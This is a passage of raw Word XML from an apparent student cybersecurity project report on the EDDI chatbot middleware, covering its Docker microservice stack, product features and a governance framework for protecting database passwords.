        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00F164EF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00F164EF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>micro-services</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00F164EF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> one,</w:t>
      </w:r>
      <w:r w:rsidR="00AE3DDE">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C627D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deployed by docker</w:t>
      </w:r>
      <w:r w:rsidR="00F164EF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00F164EF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compose by these service</w:t>
      </w:r>
      <w:r w:rsidR="00F164EF">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00A85275">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680815B0" w14:textId="7A3EA3F8" w:rsidR="00A85275" w:rsidRDefault="00A85275" w:rsidP="00A85275">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Backend written in </w:t>
      </w:r>
      <w:r w:rsidRPr="00042884">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>JAVA</w:t>
      </w:r>
      <w:r w:rsidR="00042884">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69706F47" w14:textId="5D860A1B" w:rsidR="00A85275" w:rsidRDefault="00A85275" w:rsidP="00A85275">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Frontend written in html, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>css</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00042884">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and processed using</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00916779" w:rsidRPr="00042884">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00042884">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00042884">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>template;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E4F6E1" w14:textId="75F5BAD3" w:rsidR="00042884" w:rsidRDefault="00AE3DDE" w:rsidP="00A85275">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008827B5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>MongoDB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> database;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA2A1F7" w14:textId="2C39A876" w:rsidR="00AE3DDE" w:rsidRPr="00A85275" w:rsidRDefault="00AE3DDE" w:rsidP="00A85275">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008827B5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SQLITE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> database</w:t>
      </w:r>
      <w:r w:rsidR="008827B5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (added for didactical example of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008827B5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008827B5">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-injection)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A205349" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The most important key features of EDDI are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7338B7" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Cloud-native architecture: Java- and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Quarkus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-based, E.D.D.I is lightweight, RESTful, scalable, and cloud-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>optimised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. It can be deployed as a Docker container and orchestrated using Kubernetes or OpenShift.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B694CE9" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Advanced Conversation Management: Provides the capability to manage conversational triggers and state, enabling smooth and cohesive communication between people and chatbots.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C565AB1" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Integration with conversational APIs: Allows integration with different artificial intelligence APIs to integrate multiple chatbots and their various versions for updates and switching.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F2E97A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Configurable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> rules: Allows the setting of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> rules to orchestrate the interaction of large language models (LLMs) and to change chatbot responses based on context.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67032A79" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_75ne9lx3mhu1"/>
      <w:bookmarkEnd w:id="3"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Enterprise certifications: It is the only open-source chatbot middleware technology certified for Red Hat OpenShift and listed in the Red Hat Marketplace, guaranteeing enterprise-grade quality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E95145" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>E.D.D.I. is also designed for easy deployment across various environments, such as: Cloud (Google Cloud, AWS and Red Hat marketplaces to be scalable) or On-premises (installed locally through Docker containers to support existing infrastructure natively).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FD375D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The company behind E.D.D.I. is Labs.ai, founded by Gregor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Jarisch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Franz Weber in Vienna, the company has over 14 years of development experience and offers support and knowledge transfer in chatbot development.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75508755" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_qew7ywcsbgmu"/>
      <w:bookmarkEnd w:id="4"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>In conclusion, E.D.D.I. is a robust and flexible conversation management solution for artificial intelligence applications. It is designed for developers and companies that want to deploy a scalable solution that can be augmented with several AI services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5FAA9D" w14:textId="3A212725" w:rsidR="006C269C" w:rsidRDefault="006C269C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E795AD" w14:textId="7E012E62" w:rsidR="006C269C" w:rsidRDefault="003D5C73" w:rsidP="006C269C">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D5C73">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>General Organization and Levels of Responsibility</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCB0A08" w14:textId="240C1BC0" w:rsidR="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>section</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> outlines a concise organizational framework and responsibility matrix for the hypothetical cybersecurity project EDDI. The focus is on safeguarding two critical assets: the MongoDB administrative password (which protects user credentials) and the SQLite master password. By defining key roles, policies, and controls, the aim is to ensure clear accountability and robust protection of these sensitive credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A58E2D2" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="755A89C7" w14:textId="77777777" w:rsidR="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:t>Organizational Structure and Key Roles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4C8A8E" w14:textId="30B39B53" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDDI is structured into three main divisions: Executive Management, Technology &amp; Security, and Support Services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526C4586" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Executive Management</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CEO, COO) sets strategic direction and allocates resources for security.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB3FAA7" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Technology &amp; Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is led by the CIO and CISO. The CIO oversees technology strategy and IT budgets, while the CISO establishes security policies, conducts risk assessments, and leads incident response efforts. Under the CISO, the IT Department (including Database Administrators) handles day-to-day database configuration, patching, and backups. The Security Operations Team continuously monitors for incidents, manages vulnerabilities, and supports any necessary incident response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A38B64" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Support Services</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (HR, Legal, Risk Management) ensure personnel vetting, contractual compliance, and enterprise-wide risk oversight. HR enforces background checks and training, Legal reviews regulatory obligations (e.g., GDPR), and Risk Management maintains an asset inventory and oversees periodic risk assessments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12277A69" w14:textId="2F024C82" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43FCA897" w14:textId="77777777" w:rsidR="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:t>Asset Classification and Governance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8FC405" w14:textId="757C7E0D" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Two passwords are classified as Tier 1 assets due to their criticality:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195FBE4C" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>MongoDB Administrative Password</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Grants access to customer credentials and sensitive data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09143238" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SQLite Master Password</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Protects archived user information and application encryption keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D74231" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">A governance framework </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>mandates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B134650" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Policies</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for password complexity, rotation (every 90 days), and secure storage in a centralized vault requiring multi-factor authentication (MFA) and dual approval for retrieval.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7D5635" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Access Controls</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> enforcing least privilege: only designated DBAs, the CISO, and a senior security engineer can access these keys, and all actions occur on hardened workstations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6125DE" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Logging &amp; Monitoring</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> via a SIEM, which alerts on unusual access or repeated failed login attempts. Audit logs for database and vault access are retained for at least one year to support forensics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F67DBB" w14:textId="2B139852" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C8B2BC9" w14:textId="77777777" w:rsidR="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:t>Incident Response and Continuous Improvement</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C423EBB" w14:textId="3AED8F73" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Despite preventive measures, EDDI maintains an Incident Response Team (IRT), led by the CISO, to triage and handle potential breaches. Upon detecting suspicious activity</w:t>
      </w:r>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>such as unauthorized password retrieval or foreign IP logins</w:t>
      </w:r>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the IRT immediately:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146D76EF" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00086451">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Rotates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>compromised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>credentials</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467870FC" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
